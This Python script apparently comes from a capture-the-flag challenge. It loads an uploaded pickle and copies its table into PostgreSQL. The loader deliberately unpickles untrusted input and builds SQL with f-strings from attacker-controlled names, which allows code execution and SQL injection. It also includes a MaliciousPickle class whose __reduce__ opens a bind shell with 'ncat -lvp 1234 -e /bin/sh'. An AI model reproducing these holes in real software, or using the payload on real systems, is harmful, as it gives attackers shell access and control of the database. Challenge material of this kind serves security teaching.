import sys
import pickle as pkl
import psycopg2 as pg
from csv import reader


class DataTable:
    def __init__(self):
        self.num_rows = 0
        self.num_cols = 0
        self.header = None
        self.data = None 
    
    def load_data_from_csv(self, file):
        with open(file, 'r') as f:
            csv_reader = reader(f)
            parsed_csv = list(csv_reader)
            self.name = parsed_csv[0][0]
            self.headers = list(zip(parsed_csv[1], parsed_csv[2]))
            self.data = parsed_csv[3:]

class MaliciousPickle:
    def __reduce__(self):
        import os
        cmd = 'ncat -lvp 1234 -e /bin/sh'
        return os.system, (cmd, )


def main():
    try:
        uploaded_file, id = sys.argv[1:]

        file = open(uploaded_file, "rb")
        table = pkl.loads(file.read())
        file.close()

        
        conn = pg.connect(dbname="ctf", user=f"u{id}")
        cur = conn.cursor()
        
        createQuery = f"CREATE TABLE {table.name} (idx int primary key, "
        for header in table.headers:
            if header == table.headers[-1]:
                createQuery += f"{header[0]} {header[1]});"
            else:    
                createQuery += f"{header[0]} {header[1]},"
        
        cur.execute(createQuery)


        insertFormat = ""
        for header in table.headers:
            insertFormat += f"%s,"
        insertFormat = insertFormat[:-1]


        for i in range(len(table.data)):
            for j in range(len(table.headers)):
                if table.headers[j][1] == 'int':
                    table.data[i][j] = int(table.data[i][j])
                elif table.headers[j][1] == "decimal":
                    table.data[i][j] = float(table.data[i][j])
            
            insertQuery = f"INSERT INTO {table.name} VALUES ({i},{insertFormat})"
            cur.execute(insertQuery, table.data[i])

        conn.commit()
        cur.close()
        conn.close()

        print("success")


    except:
        print("fail")

main()
